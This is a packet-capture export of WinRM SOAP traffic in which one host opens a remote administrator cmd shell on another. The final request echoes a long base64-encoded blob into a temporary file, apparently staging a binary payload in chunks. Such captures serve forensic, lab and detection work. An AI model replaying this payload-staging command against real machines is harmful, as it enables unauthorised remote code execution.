frame.number	ip.src	tcp.srcport	ip.dst	tcp.dstport	http.file_data
2752	192.168.2.2	5985	192.168.1.3	36745	
2758	192.168.1.3	33429	192.168.2.2	5985	\n      <?xml version="1.0" encoding="UTF-8"?>\n      <env:Envelope xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:b="http://schemas.dmtf.org/wbem/wsman/1/cimbinding.xsd"\n      xmlns:cfg="http://schemas.microsoft.com/wbem/wsman/1/config" xmlns:env="http://www.w3.org/2003/05/soap-envelope"\n      xmlns:n="http://schemas.xmlsoap.org/ws/2004/09/enumeration" xmlns:p="http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd"\n      xmlns:rsp="http://schemas.microsoft.com/wbem/wsman/1/windows/shell" xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd"\n      xmlns:x="http://schemas.xmlsoap.org/ws/2004/09/transfer" xmlns:xsd="http://www.w3.org/2001/XMLSchema"\n      xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"> \n      <env:Header>\n      <a:To>http://192.168.2.2:5985</a:To>\n      <a:ReplyTo>\n        <a:Address mustUnderstand="true">http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</a:Address>\n      </a:ReplyTo>\n      <w:MaxEnvelopeSize mustUnderstand="true">153600</w:MaxEnvelopeSize>\n      <a:MessageID>uuid:0bb2e20b-7337-bcaf-30fd-1863e1218368</a:MessageID>\n      <w:Locale mustUnderstand="false" xml:lang="en-US"/>\n      <p:DataLocale mustUnderstand="false" xml:lang="en-US"/>\n      <w:OperationTimeout>PT60S</w:OperationTimeout>\n      <w:ResourceURI mustUnderstand="true">http://schemas.microsoft.com/wbem/wsman/1/windows/shell/cmd</w:ResourceURI>\n      <a:Action mustUnderstand="true">http://schemas.microsoft.com/wbem/wsman/1/windows/shell/Receive</a:Action><w:SelectorSet><w:Selector Name="ShellId">B86D5657-6801-40D3-90A1-B7A85A933E8A</w:Selector></w:SelectorSet>\n    </env:Header>\n    <env:Body>\n      <rsp:Receive>\n        <rsp:DesiredStream CommandId="9234805D-32EC-4070-9AA7-5F026539B7EC">stdout stderr</rsp:DesiredStream>\n      </rsp:Receive>\n    </env:Body></env:Envelope>\n    
2760	192.168.2.2	5985	192.168.1.3	33429	<s:Envelope xml:lang="en-US" xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd" xmlns:rsp="http://schemas.microsoft.com/wbem/wsman/1/windows/shell" xmlns:p="http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd"><s:Header><a:Action>http://schemas.microsoft.com/wbem/wsman/1/windows/shell/ReceiveResponse</a:Action><a:MessageID>uuid:B1C12B0F-01A4-4873-9711-C69B5BD24CC8</a:MessageID><a:To>http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</a:To><a:RelatesTo>uuid:0bb2e20b-7337-bcaf-30fd-1863e1218368</a:RelatesTo></s:Header><s:Body><rsp:ReceiveResponse><rsp:CommandState CommandId="9234805D-32EC-4070-9AA7-5F026539B7EC" State="http://schemas.microsoft.com/wbem/wsman/1/windows/shell/CommandState/Done"><rsp:ExitCode>0</rsp:ExitCode></rsp:CommandState></rsp:ReceiveResponse></s:Body></s:Envelope>
2768	192.168.1.3	34975	192.168.2.2	5985	\n      <?xml version="1.0" encoding="UTF-8"?>\n      <env:Envelope xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:b="http://schemas.dmtf.org/wbem/wsman/1/cimbinding.xsd"\n      xmlns:cfg="http://schemas.microsoft.com/wbem/wsman/1/config" xmlns:env="http://www.w3.org/2003/05/soap-envelope"\n      xmlns:n="http://schemas.xmlsoap.org/ws/2004/09/enumeration" xmlns:p="http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd"\n      xmlns:rsp="http://schemas.microsoft.com/wbem/wsman/1/windows/shell" xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd"\n      xmlns:x="http://schemas.xmlsoap.org/ws/2004/09/transfer" xmlns:xsd="http://www.w3.org/2001/XMLSchema"\n      xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"> \n      <env:Header>\n      <a:To>http://192.168.2.2:5985</a:To>\n      <a:ReplyTo>\n        <a:Address mustUnderstand="true">http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</a:Address>\n      </a:ReplyTo>\n      <w:MaxEnvelopeSize mustUnderstand="true">153600</w:MaxEnvelopeSize>\n      <a:MessageID>uuid:99904801-b15c-0831-fd20-6a52d7920742</a:MessageID>\n      <w:Locale mustUnderstand="false" xml:lang="en-US"/>\n      <p:DataLocale mustUnderstand="false" xml:lang="en-US"/>\n      <w:OperationTimeout>PT60S</w:OperationTimeout>\n      <w:ResourceURI mustUnderstand="true">http://schemas.microsoft.com/wbem/wsman/1/windows/shell/cmd</w:ResourceURI>\n      <a:Action mustUnderstand="true">http://schemas.microsoft.com/wbem/wsman/1/windows/shell/Signal</a:Action><w:SelectorSet><w:Selector Name="ShellId">B86D5657-6801-40D3-90A1-B7A85A933E8A</w:Selector></w:SelectorSet>\n    </env:Header>\n     <env:Body>\n      <rsp:Signal CommandId="9234805D-32EC-4070-9AA7-5F026539B7EC">\n        <rsp:Code>http://schemas.microsoft.com/wbem/wsman/1/windows/shell/signal/terminate</rsp:Code>\n      </rsp:Signal>\n    </env:Body></env:Envelope>\n    
2770	192.168.2.2	5985	192.168.1.3	34975	
2776	192.168.1.3	42207	192.168.2.2	5985	\n      <?xml version="1.0" encoding="UTF-8"?>\n      <env:Envelope xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:b="http://schemas.dmtf.org/wbem/wsman/1/cimbinding.xsd"\n      xmlns:cfg="http://schemas.microsoft.com/wbem/wsman/1/config" xmlns:env="http://www.w3.org/2003/05/soap-envelope"\n      xmlns:n="http://schemas.xmlsoap.org/ws/2004/09/enumeration" xmlns:p="http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd"\n      xmlns:rsp="http://schemas.microsoft.com/wbem/wsman/1/windows/shell" xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd"\n      xmlns:x="http://schemas.xmlsoap.org/ws/2004/09/transfer" xmlns:xsd="http://www.w3.org/2001/XMLSchema"\n      xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"> \n      <env:Header>\n      <a:To>http://192.168.2.2:5985</a:To>\n      <a:ReplyTo>\n        <a:Address mustUnderstand="true">http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</a:Address>\n      </a:ReplyTo>\n      <w:MaxEnvelopeSize mustUnderstand="true">153600</w:MaxEnvelopeSize>\n      <a:MessageID>uuid:99904801-b15c-0831-fd20-6a52d7920742</a:MessageID>\n      <w:Locale mustUnderstand="false" xml:lang="en-US"/>\n      <p:DataLocale mustUnderstand="false" xml:lang="en-US"/>\n      <w:OperationTimeout>PT60S</w:OperationTimeout>\n      <w:ResourceURI mustUnderstand="true">http://schemas.microsoft.com/wbem/wsman/1/windows/shell/cmd</w:ResourceURI>\n      <a:Action mustUnderstand="true">http://schemas.microsoft.com/wbem/wsman/1/windows/shell/Signal</a:Action><w:SelectorSet><w:Selector Name="ShellId">B86D5657-6801-40D3-90A1-B7A85A933E8A</w:Selector></w:SelectorSet>\n    </env:Header>\n     <env:Body>\n      <rsp:Signal CommandId="9234805D-32EC-4070-9AA7-5F026539B7EC">\n        <rsp:Code>http://schemas.microsoft.com/wbem/wsman/1/windows/shell/signal/terminate</rsp:Code>\n      </rsp:Signal>\n    </env:Body></env:Envelope>\n    
2778	192.168.2.2	5985	192.168.1.3	42207	<s:Envelope xml:lang="en-US" xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:x="http://schemas.xmlsoap.org/ws/2004/09/transfer" xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd" xmlns:rsp="http://schemas.microsoft.com/wbem/wsman/1/windows/shell" xmlns:p="http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd"><s:Header><a:Action>http://schemas.microsoft.com/wbem/wsman/1/windows/shell/SignalResponse</a:Action><a:MessageID>uuid:FE46C823-6E18-45E9-B1E4-ACD2CEB9EFC5</a:MessageID><a:To>http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</a:To><a:RelatesTo>uuid:99904801-b15c-0831-fd20-6a52d7920742</a:RelatesTo></s:Header><s:Body><rsp:SignalResponse/></s:Body></s:Envelope>
2786	192.168.1.3	42749	192.168.2.2	5985	\n      <?xml version="1.0" encoding="UTF-8"?>\n      <env:Envelope xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:b="http://schemas.dmtf.org/wbem/wsman/1/cimbinding.xsd"\n      xmlns:cfg="http://schemas.microsoft.com/wbem/wsman/1/config" xmlns:env="http://www.w3.org/2003/05/soap-envelope"\n      xmlns:n="http://schemas.xmlsoap.org/ws/2004/09/enumeration" xmlns:p="http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd"\n      xmlns:rsp="http://schemas.microsoft.com/wbem/wsman/1/windows/shell" xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd"\n      xmlns:x="http://schemas.xmlsoap.org/ws/2004/09/transfer" xmlns:xsd="http://www.w3.org/2001/XMLSchema"\n      xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"> \n      <env:Header>\n      <a:To>http://192.168.2.2:5985</a:To>\n      <a:ReplyTo>\n        <a:Address mustUnderstand="true">http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</a:Address>\n      </a:ReplyTo>\n      <w:MaxEnvelopeSize mustUnderstand="true">153600</w:MaxEnvelopeSize>\n      <a:MessageID>uuid:8448e852-b456-2f80-3cfc-c2cd20a6936a</a:MessageID>\n      <w:Locale mustUnderstand="false" xml:lang="en-US"/>\n      <p:DataLocale mustUnderstand="false" xml:lang="en-US"/>\n      <w:OperationTimeout>PT60S</w:OperationTimeout>\n      <w:ResourceURI mustUnderstand="true">http://schemas.microsoft.com/wbem/wsman/1/windows/shell/cmd</w:ResourceURI>\n      <a:Action mustUnderstand="true">http://schemas.xmlsoap.org/ws/2004/09/transfer/Delete</a:Action><w:SelectorSet><w:Selector Name="ShellId">B86D5657-6801-40D3-90A1-B7A85A933E8A</w:Selector></w:SelectorSet>\n    </env:Header>\n    <env:Body/></env:Envelope>\n    
2788	192.168.2.2	5985	192.168.1.3	42749	
2794	192.168.1.3	42025	192.168.2.2	5985	\n      <?xml version="1.0" encoding="UTF-8"?>\n      <env:Envelope xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:b="http://schemas.dmtf.org/wbem/wsman/1/cimbinding.xsd"\n      xmlns:cfg="http://schemas.microsoft.com/wbem/wsman/1/config" xmlns:env="http://www.w3.org/2003/05/soap-envelope"\n      xmlns:n="http://schemas.xmlsoap.org/ws/2004/09/enumeration" xmlns:p="http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd"\n      xmlns:rsp="http://schemas.microsoft.com/wbem/wsman/1/windows/shell" xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd"\n      xmlns:x="http://schemas.xmlsoap.org/ws/2004/09/transfer" xmlns:xsd="http://www.w3.org/2001/XMLSchema"\n      xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"> \n      <env:Header>\n      <a:To>http://192.168.2.2:5985</a:To>\n      <a:ReplyTo>\n        <a:Address mustUnderstand="true">http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</a:Address>\n      </a:ReplyTo>\n      <w:MaxEnvelopeSize mustUnderstand="true">153600</w:MaxEnvelopeSize>\n      <a:MessageID>uuid:8448e852-b456-2f80-3cfc-c2cd20a6936a</a:MessageID>\n      <w:Locale mustUnderstand="false" xml:lang="en-US"/>\n      <p:DataLocale mustUnderstand="false" xml:lang="en-US"/>\n      <w:OperationTimeout>PT60S</w:OperationTimeout>\n      <w:ResourceURI mustUnderstand="true">http://schemas.microsoft.com/wbem/wsman/1/windows/shell/cmd</w:ResourceURI>\n      <a:Action mustUnderstand="true">http://schemas.xmlsoap.org/ws/2004/09/transfer/Delete</a:Action><w:SelectorSet><w:Selector Name="ShellId">B86D5657-6801-40D3-90A1-B7A85A933E8A</w:Selector></w:SelectorSet>\n    </env:Header>\n    <env:Body/></env:Envelope>\n    
2796	192.168.2.2	5985	192.168.1.3	42025	<s:Envelope xml:lang="en-US" xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd" xmlns:p="http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd"><s:Header><a:Action>http://schemas.xmlsoap.org/ws/2004/09/transfer/DeleteResponse</a:Action><a:MessageID>uuid:A9BABFCC-1B98-4789-85B0-18A8F55A0D98</a:MessageID><a:To>http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</a:To><a:RelatesTo>uuid:8448e852-b456-2f80-3cfc-c2cd20a6936a</a:RelatesTo></s:Header><s:Body></s:Body></s:Envelope>
2804	192.168.1.3	46503	192.168.2.2	5985	\n      <?xml version="1.0" encoding="UTF-8"?>\n      <env:Envelope xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:b="http://schemas.dmtf.org/wbem/wsman/1/cimbinding.xsd"\n      xmlns:cfg="http://schemas.microsoft.com/wbem/wsman/1/config" xmlns:env="http://www.w3.org/2003/05/soap-envelope"\n      xmlns:n="http://schemas.xmlsoap.org/ws/2004/09/enumeration" xmlns:p="http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd"\n      xmlns:rsp="http://schemas.microsoft.com/wbem/wsman/1/windows/shell" xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd"\n      xmlns:x="http://schemas.xmlsoap.org/ws/2004/09/transfer" xmlns:xsd="http://www.w3.org/2001/XMLSchema"\n      xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"> \n      <env:Header>\n      <a:To>http://192.168.2.2:5985</a:To>\n      <a:ReplyTo>\n        <a:Address mustUnderstand="true">http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</a:Address>\n      </a:ReplyTo>\n      <w:MaxEnvelopeSize mustUnderstand="true">153600</w:MaxEnvelopeSize>\n      <a:MessageID>uuid:84a00a53-09ba-9745-ddcb-10bfb315ad64</a:MessageID>\n      <w:Locale mustUnderstand="false" xml:lang="en-US"/>\n      <p:DataLocale mustUnderstand="false" xml:lang="en-US"/>\n      <w:OperationTimeout>PT60S</w:OperationTimeout>\n      <w:ResourceURI mustUnderstand="true">http://schemas.microsoft.com/wbem/wsman/1/windows/shell/cmd</w:ResourceURI>\n      <a:Action mustUnderstand="true">http://schemas.xmlsoap.org/ws/2004/09/transfer/Create</a:Action><w:OptionSet><w:Option Name="WINRS_NOPROFILE">FALSE</w:Option><w:Option Name="WINRS_CODEPAGE">437</w:Option></w:OptionSet>\n    </env:Header>\n    <env:Body>\n      <rsp:Shell>\n    <rsp:InputStreams>stdin</rsp:InputStreams>\n    <rsp:OutputStreams>stdout stderr</rsp:OutputStreams>\n    </rsp:Shell>\n    </env:Body></env:Envelope>\n    
2806	192.168.2.2	5985	192.168.1.3	46503	
2812	192.168.1.3	42915	192.168.2.2	5985	\n      <?xml version="1.0" encoding="UTF-8"?>\n      <env:Envelope xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:b="http://schemas.dmtf.org/wbem/wsman/1/cimbinding.xsd"\n      xmlns:cfg="http://schemas.microsoft.com/wbem/wsman/1/config" xmlns:env="http://www.w3.org/2003/05/soap-envelope"\n      xmlns:n="http://schemas.xmlsoap.org/ws/2004/09/enumeration" xmlns:p="http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd"\n      xmlns:rsp="http://schemas.microsoft.com/wbem/wsman/1/windows/shell" xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd"\n      xmlns:x="http://schemas.xmlsoap.org/ws/2004/09/transfer" xmlns:xsd="http://www.w3.org/2001/XMLSchema"\n      xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"> \n      <env:Header>\n      <a:To>http://192.168.2.2:5985</a:To>\n      <a:ReplyTo>\n        <a:Address mustUnderstand="true">http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</a:Address>\n      </a:ReplyTo>\n      <w:MaxEnvelopeSize mustUnderstand="true">153600</w:MaxEnvelopeSize>\n      <a:MessageID>uuid:84a00a53-09ba-9745-ddcb-10bfb315ad64</a:MessageID>\n      <w:Locale mustUnderstand="false" xml:lang="en-US"/>\n      <p:DataLocale mustUnderstand="false" xml:lang="en-US"/>\n      <w:OperationTimeout>PT60S</w:OperationTimeout>\n      <w:ResourceURI mustUnderstand="true">http://schemas.microsoft.com/wbem/wsman/1/windows/shell/cmd</w:ResourceURI>\n      <a:Action mustUnderstand="true">http://schemas.xmlsoap.org/ws/2004/09/transfer/Create</a:Action><w:OptionSet><w:Option Name="WINRS_NOPROFILE">FALSE</w:Option><w:Option Name="WINRS_CODEPAGE">437</w:Option></w:OptionSet>\n    </env:Header>\n    <env:Body>\n      <rsp:Shell>\n    <rsp:InputStreams>stdin</rsp:InputStreams>\n    <rsp:OutputStreams>stdout stderr</rsp:OutputStreams>\n    </rsp:Shell>\n    </env:Body></env:Envelope>\n    
2814	192.168.2.2	5985	192.168.1.3	42915	<s:Envelope xml:lang="en-US" xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:x="http://schemas.xmlsoap.org/ws/2004/09/transfer" xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd" xmlns:rsp="http://schemas.microsoft.com/wbem/wsman/1/windows/shell" xmlns:p="http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd"><s:Header><a:Action>http://schemas.xmlsoap.org/ws/2004/09/transfer/CreateResponse</a:Action><a:MessageID>uuid:7B93554F-71F7-4A80-938C-45B1CA023569</a:MessageID><a:To>http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</a:To><a:RelatesTo>uuid:84a00a53-09ba-9745-ddcb-10bfb315ad64</a:RelatesTo></s:Header><s:Body><x:ResourceCreated><a:Address>http://192.168.2.2:5985</a:Address><a:ReferenceParameters><w:ResourceURI>http://schemas.microsoft.com/wbem/wsman/1/windows/shell/cmd</w:ResourceURI><w:SelectorSet><w:Selector Name="ShellId">7B61BA54-A2C4-4EA7-8414-28D678076F3A</w:Selector></w:SelectorSet></a:ReferenceParameters></x:ResourceCreated><rsp:Shell xmlns:rsp="http://schemas.microsoft.com/wbem/wsman/1/windows/shell"><rsp:ShellId>7B61BA54-A2C4-4EA7-8414-28D678076F3A</rsp:ShellId><rsp:ResourceUri>http://schemas.microsoft.com/wbem/wsman/1/windows/shell/cmd</rsp:ResourceUri><rsp:Owner>administrator</rsp:Owner><rsp:ClientIP>192.168.1.3</rsp:ClientIP><rsp:IdleTimeOut>PT7200.000S</rsp:IdleTimeOut><rsp:InputStreams>stdin</rsp:InputStreams><rsp:OutputStreams>stdout stderr</rsp:OutputStreams><rsp:ShellRunTime>P0DT0H0M0S</rsp:ShellRunTime><rsp:ShellInactivity>P0DT0H0M0S</rsp:ShellInactivity></rsp:Shell></s:Body></s:Envelope>
2823	192.168.1.3	36285	192.168.2.2	5985	\n      <?xml version="1.0" encoding="UTF-8"?>\n      <env:Envelope xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:b="http://schemas.dmtf.org/wbem/wsman/1/cimbinding.xsd"\n      xmlns:cfg="http://schemas.microsoft.com/wbem/wsman/1/config" xmlns:env="http://www.w3.org/2003/05/soap-envelope"\n      xmlns:n="http://schemas.xmlsoap.org/ws/2004/09/enumeration" xmlns:p="http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd"\n      xmlns:rsp="http://schemas.microsoft.com/wbem/wsman/1/windows/shell" xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd"\n      xmlns:x="http://schemas.xmlsoap.org/ws/2004/09/transfer" xmlns:xsd="http://www.w3.org/2001/XMLSchema"\n      xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"> \n      <env:Header>\n      <a:To>http://192.168.2.2:5985</a:To>\n      <a:ReplyTo>\n        <a:Address mustUnderstand="true">http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</a:Address>\n      </a:ReplyTo>\n      <w:MaxEnvelopeSize mustUnderstand="true">153600</w:MaxEnvelopeSize>\n      <a:MessageID>uuid:528256a9-b117-f4f5-7c2c-bfc18dd40b0a</a:MessageID>\n      <w:Locale mustUnderstand="false" xml:lang="en-US"/>\n      <p:DataLocale mustUnderstand="false" xml:lang="en-US"/>\n      <w:OperationTimeout>PT60S</w:OperationTimeout>\n      <w:ResourceURI mustUnderstand="true">http://schemas.microsoft.com/wbem/wsman/1/windows/shell/cmd</w:ResourceURI>\n      <a:Action mustUnderstand="true">http://schemas.microsoft.com/wbem/wsman/1/windows/shell/Command</a:Action><w:OptionSet><w:Option Name="WINRS_CONSOLEMODE_STDIN">TRUE</w:Option><w:Option Name="WINRS_SKIP_CMD_SHELL">FALSE</w:Option></w:OptionSet><w:SelectorSet><w:Selector Name="ShellId">7B61BA54-A2C4-4EA7-8414-28D678076F3A</w:Selector></w:SelectorSet>\n    </env:Header>\n     <env:Body>\n      <rsp:CommandLine>\n        <rsp:Command>&quot;echo 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>>%TEMP%\QvnxI.b64&quot;</rsp:Command>\n      </rsp:CommandLine>\n    </env:Body></env:Envelope>\n    
2825	192.168.2.2	5985	192.168.1.3	36285	
